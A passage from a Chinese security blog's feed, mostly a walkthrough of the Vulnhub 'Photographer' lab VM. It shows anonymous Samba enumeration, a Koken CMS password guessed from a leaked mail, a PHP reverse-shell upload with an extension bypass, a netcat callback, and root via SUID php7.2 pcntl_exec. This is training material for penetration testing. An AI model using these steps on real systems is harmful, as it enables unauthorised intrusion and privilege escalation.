&lt;p&gt;Apache Struts 2.0.0到2.5.20强制执行双重OGNL计算，当对原始用户输入的标记属性进行计算时，可能会导致远程代码执行。&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="漏洞复现" scheme="https://lunamoore.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    <category term="CVE" scheme="https://lunamoore.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CVE/"/>
    
    <category term="Strust2" scheme="https://lunamoore.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CVE/Strust2/"/>
    
    
    <category term="CVE" scheme="https://lunamoore.github.io/tags/CVE/"/>
    
    <category term="调教" scheme="https://lunamoore.github.io/tags/%E8%B0%83%E6%95%99/"/>
    
    <category term="Strust2" scheme="https://lunamoore.github.io/tags/Strust2/"/>
    
  </entry>
  
  <entry>
    <title>Photographer</title>
    <link href="https://lunamoore.github.io/2020/12/18/Photographer/"/>
    <id>https://lunamoore.github.io/2020/12/18/Photographer/</id>
    <published>2020-12-18T13:00:50.000Z</published>
    <updated>2020-12-19T02:36:15.120Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-官网描述"><a href="#0x00-官网描述" class="headerlink" title="0x00.官网描述"></a>0x00.官网描述</h2><blockquote><p>This machine was developed to prepare for OSCP. It is boot2root, tested on VirtualBox (but works on VMWare) and has two flags: user.txt and proof.txt.</p></blockquote><a id="more"></a><h2 id="0x01-信息收集，上nmap"><a href="#0x01-信息收集，上nmap" class="headerlink" title="0x01.信息收集，上nmap"></a>0x01.信息收集，上nmap</h2><p><code>可以发现可以发现1为网关，254为物理机，129为kali，那么135就是目标</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/vulnhub/photographer# nmap -sP 192.168.1.0/24 -oN nmap.sP</span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-18 06:13 EST</span><br><span class="line">Nmap scan report for 192.168.1.1</span><br><span class="line">Host is up (0.00024s latency).</span><br><span class="line">MAC Address: 00:50:56:C0:00:01 (VMware)</span><br><span class="line">Nmap scan report for 192.168.1.135</span><br><span class="line">Host is up (0.00018s latency).</span><br><span class="line">MAC Address: 00:0C:29:2D:43:1A (VMware)</span><br><span class="line">Nmap scan report for 192.168.1.254</span><br><span class="line">Host is up (0.00017s latency).</span><br><span class="line">MAC Address: 00:50:56:EB:EE:5F (VMware)</span><br><span class="line">Nmap scan report for 192.168.1.129</span><br><span class="line">Host is up.</span><br><span class="line">Nmap done: 256 IP addresses (4 hosts up) scanned in 27.96 seconds</span><br><span class="line">root@JIYE:~/vulnhub/photographer#</span><br></pre></td></tr></table></figure><h2 id="0x02-扫描端口"><a href="#0x02-扫描端口" class="headerlink" title="0x02.扫描端口"></a>0x02.扫描端口</h2><p><code>可以看到开放了80、139、8000、445(SMB)等敏感端口</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/vulnhub/photographer# nmap -sC -sV -sT 192.168.1.135 -oN nmap.CVT</span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-18 06:23 EST</span><br><span class="line">Nmap scan report for 192.168.1.135</span><br><span class="line">Host is up (0.0010s latency).</span><br><span class="line">Not shown: 996 closed ports</span><br><span class="line">PORT     STATE SERVICE      VERSION</span><br><span class="line">80/tcp   open  http         Apache httpd 2.4.18 ((Ubuntu))</span><br><span class="line">|_http-server-header: Apache/2.4.18 (Ubuntu)</span><br><span class="line">|_http-title: Photographer by v1n1v131r4</span><br><span class="line">139/tcp  open  netbios-ssn  Samba smbd 3.X - 4.X (workgroup: WORKGROUP)</span><br><span class="line">445/tcp  open  netbios-ssn  Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)</span><br><span class="line">8000/tcp open  ssl/http-alt Apache/2.4.18 (Ubuntu)</span><br><span class="line">|_http-generator: Koken 0.22.24</span><br><span class="line">|_http-server-header: Apache/2.4.18 (Ubuntu)</span><br><span class="line">|_http-title: daisa ahomi</span><br><span class="line">MAC Address: 00:0C:29:2D:43:1A (VMware)</span><br><span class="line">Service Info: Host: PHOTOGRAPHER</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_clock-skew: mean: 9h40m00s, deviation: 2h53m12s, median: 7h59m59s</span><br><span class="line">|_nbstat: NetBIOS name: PHOTOGRAPHER, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)</span><br><span class="line">| smb-os-discovery: </span><br><span class="line">|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)</span><br><span class="line">|   Computer name: photographer</span><br><span class="line">|   NetBIOS computer name: PHOTOGRAPHER\x00</span><br><span class="line">|   Domain name: \x00</span><br><span class="line">|   FQDN: photographer</span><br><span class="line">|_  System time: 2020-12-18T14:23:58-05:00</span><br><span class="line">| smb-security-mode: </span><br><span class="line">|   account_used: guest</span><br><span class="line">|   authentication_level: user</span><br><span class="line">|   challenge_response: supported</span><br><span class="line">|_  message_signing: disabled (dangerous, but default)</span><br><span class="line">| smb2-security-mode: </span><br><span class="line">|   2.02: </span><br><span class="line">|_    Message signing enabled but not required</span><br><span class="line">| smb2-time: </span><br><span class="line">|   date: 2020-12-18T19:23:57</span><br><span class="line">|_  start_date: N/A</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 55.84 seconds</span><br><span class="line">root@JIYE:~/vulnhub/photographer#</span><br></pre></td></tr></table></figure><h2 id="0x03-访问80端口"><a href="#0x03-访问80端口" class="headerlink" title="0x03.访问80端口"></a>0x03.访问80端口</h2><p><code>手动爬虫，是一个静态界面，没有什么发现</code></p><img src="/2020/12/18/Photographer/image-20201218192822059.png" class><h2 id="0x04-访问8000端口"><a href="#0x04-访问8000端口" class="headerlink" title="0x04.访问8000端口"></a>0x04.访问8000端口</h2><p><code>手动爬虫，发现CMS为Koken，并且发现一个shell.php不知道肝肾的。</code></p><img src="/2020/12/18/Photographer/image-20201218193224511.png" class><p><code>查看源码，发现CMS版本为0.22.24</code></p><img src="/2020/12/18/Photographer/image-20201218193326700.png" class><h2 id="0x05-Google-exploit"><a href="#0x05-Google-exploit" class="headerlink" title="0x05.Google exploit"></a>0x05.Google exploit</h2><p><code>找到一个文件上传，emmmmmm.刚才爬虫的页面没有上传点，所以猜测需要登入到后台进行上传。</code></p><img src="/2020/12/18/Photographer/image-20201218193515066.png" class><h2 id="0x06-访问admin目录（🙃竟然成功了）"><a href="#0x06-访问admin目录（🙃竟然成功了）" class="headerlink" title="0x06.访问admin目录（🙃竟然成功了）"></a>0x06.访问admin目录（🙃竟然成功了）</h2><p><code>这里其实需要扫一下目录，但是猜到了admin，就不赘述了🌚。</code></p><img src="/2020/12/18/Photographer/image-20201218193934550.png" class><p><code>尝试弱口令登入，可以看到用户名需要是一个邮箱，但不是知道格式，故无法进行爆破。</code></p><img src="/2020/12/18/Photographer/image-20201218194227961.png" class><h2 id="0x07-审查445端口"><a href="#0x07-审查445端口" class="headerlink" title="0x07.审查445端口"></a>0x07.审查445端口</h2><p><code>前面发现了开放了445端口，所以使用enum4linux开始探索一下</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~# enum4linux -a -o 192.168.1.135</span><br><span class="line">Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Fri Dec 18 06:45:16 2020</span><br><span class="line"></span><br><span class="line"> ========================== </span><br><span class="line">|    Target Information    |</span><br><span class="line"> ========================== </span><br><span class="line">Target ........... 192.168.1.135</span><br><span class="line">RID Range ........ 500-550,1000-1050</span><br><span class="line">Username ......... &#x27;&#x27;</span><br><span class="line">Password ......... &#x27;&#x27;</span><br><span class="line">Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> ===================================================== </span><br><span class="line">|    Enumerating Workgroup/Domain on 192.168.1.135    |</span><br><span class="line"> ===================================================== </span><br><span class="line">[+] Got domain/workgroup name: WORKGROUP</span><br><span class="line"></span><br><span class="line"> ============================================= </span><br><span class="line">|    Nbtstat Information for 192.168.1.135    |</span><br><span class="line"> ============================================= </span><br><span class="line">Looking up status of 192.168.1.135</span><br><span class="line">        PHOTOGRAPHER    &lt;00&gt; -         B &lt;ACTIVE&gt;  Workstation Service</span><br><span class="line">        PHOTOGRAPHER    &lt;03&gt; -         B &lt;ACTIVE&gt;  Messenger Service</span><br><span class="line">        PHOTOGRAPHER    &lt;20&gt; -         B &lt;ACTIVE&gt;  File Server Service</span><br><span class="line">        ..__MSBROWSE__. &lt;01&gt; - &lt;GROUP&gt; B &lt;ACTIVE&gt;  Master Browser</span><br><span class="line">        WORKGROUP       &lt;00&gt; - &lt;GROUP&gt; B &lt;ACTIVE&gt;  Domain/Workgroup Name</span><br><span class="line">        WORKGROUP       &lt;1d&gt; -         B &lt;ACTIVE&gt;  Master Browser</span><br><span class="line">        WORKGROUP       &lt;1e&gt; - &lt;GROUP&gt; B &lt;ACTIVE&gt;  Browser Service Elections</span><br><span class="line"></span><br><span class="line">        MAC Address = 00-00-00-00-00-00</span><br><span class="line"></span><br><span class="line"> ====================================== </span><br><span class="line">|    Session Check on 192.168.1.135    |</span><br><span class="line"> ====================================== </span><br><span class="line">[+] Server 192.168.1.135 allows sessions using username &#x27;&#x27;, password &#x27;&#x27;</span><br><span class="line"></span><br><span class="line"> ============================================ </span><br><span class="line">|    Getting domain SID for 192.168.1.135    |</span><br><span class="line"> ============================================ </span><br><span class="line">Domain Name: WORKGROUP</span><br><span class="line">Domain Sid: (NULL SID)</span><br><span class="line">[+] Can&#x27;t determine if host is part of domain or part of a workgroup</span><br><span class="line"></span><br><span class="line"> ======================================= </span><br><span class="line">|    OS information on 192.168.1.135    |</span><br><span class="line"> ======================================= </span><br><span class="line">Use of uninitialized value $os_info in concatenation (.) or string at ./enum4linux.pl line 464.</span><br><span class="line">[+] Got OS info for 192.168.1.135 from smbclient: </span><br><span class="line">[+] Got OS info for 192.168.1.135 from srvinfo:</span><br><span class="line">        PHOTOGRAPHER   Wk Sv PrQ Unx NT SNT photographer server (Samba, Ubuntu)</span><br><span class="line">        platform_id     :       500</span><br><span class="line">        os version      :       6.1</span><br><span class="line">        server type     :       0x809a03</span><br><span class="line"></span><br><span class="line"> ============================== </span><br><span class="line">|    Users on 192.168.1.135    |</span><br><span class="line"> ============================== </span><br><span class="line">Use of uninitialized value $users in print at ./enum4linux.pl line 874.</span><br><span class="line">Use of uninitialized value $users in pattern match (m//) at ./enum4linux.pl line 877.</span><br><span class="line"></span><br><span class="line">Use of uninitialized value $users in print at ./enum4linux.pl line 888.</span><br><span class="line">Use of uninitialized value $users in pattern match (m//) at ./enum4linux.pl line 890.</span><br><span class="line"></span><br><span class="line"> ========================================== </span><br><span class="line">|    Share Enumeration on 192.168.1.135    |</span><br><span class="line"> ========================================== </span><br><span class="line"></span><br><span class="line">        Sharename       Type      Comment</span><br><span class="line">        ---------       ----      -------</span><br><span class="line">        print$          Disk      Printer Drivers</span><br><span class="line">        sambashare      Disk      Samba on Ubuntu</span><br><span class="line">        IPC$            IPC       IPC Service (photographer server (Samba, Ubuntu))</span><br><span class="line">SMB1 disabled -- no workgroup available</span><br><span class="line"></span><br><span class="line">[+] Attempting to map shares on 192.168.1.135</span><br><span class="line">//192.168.1.135/print$  Mapping: DENIED, Listing: N/A</span><br><span class="line">//192.168.1.135/sambashare      Mapping: OK, Listing: OK</span><br><span class="line">//192.168.1.135/IPC$    [E] Can&#x27;t understand response:</span><br><span class="line">NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*</span><br><span class="line"></span><br><span class="line"> ===================================================== </span><br><span class="line">|    Password Policy Information for 192.168.1.135    |</span><br><span class="line"> ===================================================== </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">..........(省略部分无关紧要的内容)</span><br><span class="line"></span><br><span class="line"> ============================================== </span><br><span class="line">|    Getting printer info for 192.168.1.135    |</span><br><span class="line"> ============================================== </span><br><span class="line">No printers returned.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">enum4linux complete on Fri Dec 18 06:45:30 2020</span><br><span class="line"></span><br><span class="line">root@JIYE:~#</span><br></pre></td></tr></table></figure><p><code>可以发现samba服务的一个目录sambashare</code></p><blockquote><p>//192.168.1.135/sambashare      Mapping: OK, Listing: OK</p></blockquote><p><code>匿名直接连接进行查看，发现一个wordpress站点的备份文件和一个txt文件</code></p><img src="/2020/12/18/Photographer/image-20201218195708592.png" class><p><code>根据文件名mailsent.txt文件是一封发送的邮件，内容如下</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Message-ID: &lt;4129F3CA.2020509@dc.edu&gt;</span><br><span class="line">Date: Mon, 20 Jul 2020 11:40:36 -0400</span><br><span class="line">From: Agi Clarence &lt;agi@photographer.com&gt;</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.0.1) Gecko/20020823 Netscape/7.0</span><br><span class="line">X-Accept-Language: en-us, en</span><br><span class="line">MIME-Version: 1.0</span><br><span class="line">To: Daisa Ahomi &lt;daisa@photographer.com&gt;</span><br><span class="line">Subject: To Do - Daisa Website&#x27;s</span><br><span class="line">Content-Type: text/plain; charset=us-ascii; format=flowed</span><br><span class="line">Content-Transfer-Encoding: 7bit</span><br><span class="line"></span><br><span class="line">Hi Daisa!</span><br><span class="line">Your site is ready now.</span><br><span class="line">Don&#x27;t forget your secret, my babygirl ;)</span><br></pre></td></tr></table></figure><p><code>可以看到邮箱为daisa@photographer.com</code></p><p><code>还有邮件内容为你的网站现在准备好了，不要忘记你的密码my babygirl</code></p><p><code>这里推测密码为babygirl，所以尝试登入，OK推测正确</code></p><img src="/2020/12/18/Photographer/image-20201218200838692.png" class><h2 id="0x08-上传文件，反弹shell"><a href="#0x08-上传文件，反弹shell" class="headerlink" title="0x08.上传文件，反弹shell"></a>0x08.上传文件，反弹shell</h2><p><code>本次使用kali自带reverse shell路径(/usr/share/webshells/php/php-reverse-shell.php)</code></p><p><code>将IP修改为kali本身，端口为6666</code></p><img src="/2020/12/18/Photographer/image-20201218201703596.png" class><p><code>上传</code></p><img src="/2020/12/18/Photographer/image-20201218202118418.png" class><p><code>结果仅仅可以上传JPG、PNG、GIF、MP4格式文件，所以先修改文件后缀</code></p><img src="/2020/12/18/Photographer/image-20201218202345783.png" class><p><code>进行上传</code></p><img src="/2020/12/18/Photographer/image-20201218202606655.png" class><p><code>抓包将后缀改回php</code></p><img src="/2020/12/18/Photographer/image-20201218203003281.png" class><p><code>kali监听</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~# nc -nvlp 6666</span><br><span class="line">listening on [any] 6666 ...</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>点击反弹shell</code></p><img src="/2020/12/18/Photographer/image-20201218203246226.png" class><img src="/2020/12/18/Photographer/image-20201218203335202.png" class><p><code>成功get shell</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~# nc -nvlp 6666</span><br><span class="line">listening on [any] 6666 ...</span><br><span class="line">connect to [192.168.1.129] from (UNKNOWN) [192.168.1.135] 56236</span><br><span class="line">Linux photographer 4.15.0-45-generic #48~16.04.1-Ubuntu SMP Tue Jan 29 18:03:48 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux</span><br><span class="line"> 15:33:07 up  1:44,  0 users,  load average: 0.00, 0.00, 0.00</span><br><span class="line">USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT</span><br><span class="line">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br><span class="line">/bin/sh: 0: can&#x27;t access tty; job control turned off</span><br><span class="line"><span class="meta">$</span></span><br></pre></td></tr></table></figure><h2 id="0x09-提权"><a href="#0x09-提权" class="headerlink" title="0x09.提权"></a>0x09.提权</h2><p><code>首先升级shell</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> python3 -c <span class="string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span></span><br><span class="line">www-data@photographer:/$ </span><br><span class="line"></span><br><span class="line">www-data@photographer:/$</span><br></pre></td></tr></table></figure><p><code>升级交互shell</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> python3 -c <span class="string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span></span><br><span class="line">www-data@photographer:/$ </span><br><span class="line"></span><br><span class="line">www-data@photographer:/$ ^Z</span><br><span class="line">[1]+  已停止               nc -nvlp 6666</span><br><span class="line">root@JIYE:~# stty raw -echo</span><br><span class="line">root@JIYE:~# nc -nvlp 6666</span><br><span class="line"></span><br><span class="line">www-data@photographer:/$ </span><br><span class="line">www-data@photographer:/$ id</span><br><span class="line">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br><span class="line">www-data@photographer:/$</span><br></pre></td></tr></table></figure><p><code>在daisa找到user.txt的flag</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">www-data@photographer:/home/daisa$ cat user.txt </span><br><span class="line">d41d8cd98f00b204e9800998ecf8427e</span><br><span class="line">www-data@photographer:/home/daisa$</span><br></pre></td></tr></table></figure><p><code>suid提权</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br><span class="line">find / -perm -4000 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p><code>可以发现php7.2可以利用</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">www-data@photographer:/home/daisa$ find / -perm -u=s -type f 2&gt;/dev/null</span><br><span class="line">/usr/lib/dbus-1.0/dbus-daemon-launch-helper</span><br><span class="line">/usr/lib/eject/dmcrypt-get-device</span><br><span class="line">/usr/lib/xorg/Xorg.wrap</span><br><span class="line">/usr/lib/snapd/snap-confine</span><br><span class="line">/usr/lib/openssh/ssh-keysign</span><br><span class="line">/usr/lib/x86_64-linux-gnu/oxide-qt/chrome-sandbox</span><br><span class="line">/usr/lib/policykit-1/polkit-agent-helper-1</span><br><span class="line">/usr/sbin/pppd</span><br><span class="line">/usr/bin/pkexec</span><br><span class="line">/usr/bin/passwd</span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">/usr/bin/php7.2</span><br><span class="line">/usr/bin/sudo</span><br><span class="line">/usr/bin/chsh</span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/bin/ping</span><br><span class="line">/bin/fusermount</span><br><span class="line">/bin/mount</span><br><span class="line">/bin/ping6</span><br><span class="line">/bin/umount</span><br><span class="line">/bin/su</span><br><span class="line">www-data@photographer:/home/daisa$</span><br></pre></td></tr></table></figure><p><span class="exturl" data-url="aHR0cHM6Ly9ndGZvYmlucy5naXRodWIuaW8vZ3Rmb2JpbnMvcGhwLw==">提权参考<i class="fa fa-external-link-alt"></i></span></p><p><code>找到php7.2命令的目录，在/usr/bin/php7.2</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">www-data@photographer:/$ whereis php7.2</span><br><span class="line">php7: /usr/bin/php7.2 /usr/share/php7.2-mysql /usr/share/php7.2-opcache /usr/share/php7.2-xmlrpc /usr/share/php7.2-json /usr/share/php7.2-readline /usr/share/php7.2-curl /usr/share/php7.2-common /usr/share/php7.2-sqlite3 /usr/share/php7.2-zip /usr/share/php7.2-intl /usr/share/php7.2-xml /usr/share/php7.2-gd /usr/share/php7.2-mbstring</span><br><span class="line">www-data@photographer:/$ </span><br></pre></td></tr></table></figure><p><code>exploit</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">www-data@photographer:/usr/bin$ ./php7.2 -r &quot;pcntl_exec(&#x27;/bin/sh&#x27;, [&#x27;-p&#x27;]);&quot;</span><br><span class="line"><span class="meta">#</span><span class="bash"> <span class="comment"># id</span></span></span><br><span class="line">uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)</span><br><span class="line"><span class="meta">#</span><span class="bash"> whoami</span></span><br><span class="line">root</span><br><span class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">pwd</span></span></span><br><span class="line">/usr/bin</span><br><span class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">cd</span> /</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">cd</span> ~  </span></span><br><span class="line">/bin/sh: 5: cd: can&#x27;t cd to ~</span><br><span class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">cd</span> /root</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> ls</span></span><br><span class="line">proof.txt</span><br><span class="line"><span class="meta">#</span><span class="bash"> cat proof.txt</span></span><br><span class="line">                                                                   </span><br><span class="line">                                .:/://::::///:-`                                </span><br><span class="line">                            -/++:+`:--:o:  oo.-/+/:`                            </span><br><span class="line">                         -++-.`o++s-y:/s: `sh:hy`:-/+:`                         </span><br><span class="line">                       :o:``oyo/o`. `      ```/-so:+--+/`                       </span><br><span class="line">                     -o:-`yh//.                 `./ys/-.o/                      </span><br><span class="line">                    ++.-ys/:/y-                  /s-:/+/:/o`                    </span><br><span class="line">                   o/ :yo-:hNN                   .MNs./+o--s`                   </span><br><span class="line">                  ++ soh-/mMMN--.`            `.-/MMMd-o:+ -s                   </span><br><span class="line">                 .y  /++:NMMMy-.``            ``-:hMMMmoss: +/                  </span><br><span class="line">                 s-     hMMMN` shyo+:.    -/+syd+ :MMMMo     h                  </span><br><span class="line">                 h     `MMMMMy./MMMMMd:  +mMMMMN--dMMMMd     s.                 </span><br><span class="line">                 y     `MMMMMMd`/hdh+..+/.-ohdy--mMMMMMm     +-                 </span><br><span class="line">                 h      dMMMMd:````  `mmNh   ```./NMMMMs     o.                 </span><br><span class="line">                 y.     /MMMMNmmmmd/ `s-:o  sdmmmmMMMMN.     h`                 </span><br><span class="line">                 :o      sMMMMMMMMs.        -hMMMMMMMM/     :o                  </span><br><span class="line">                  s:     `sMMMMMMMo - . `. . hMMMMMMN+     `y`                  </span><br><span class="line">                  `s-      +mMMMMMNhd+h/+h+dhMMMMMMd:     `s-                   </span><br><span class="line">                   `s:    --.sNMMMMMMMMMMMMMMMMMMmo/.    -s.                    </span><br><span class="line">                     /o.`ohd:`.odNMMMMMMMMMMMMNh+.:os/ `/o`                     </span><br><span class="line">                      .++-`+y+/:`/ssdmmNNmNds+-/o-hh:-/o-                       </span><br><span class="line">                        ./+:`:yh:dso/.+-++++ss+h++.:++-                         </span><br><span class="line">                           -/+/-:-/y+/d:yh-o:+--/+/:`                           </span><br><span class="line">                              `-///////////////:`                               </span><br><span class="line">                                                                                </span><br><span class="line"></span><br><span class="line">Follow me at: http://v1n1v131r4.com</span><br><span class="line">d41d8cd98f00b204e9800998ecf8427e</span><br><span class="line"><span class="meta">#</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
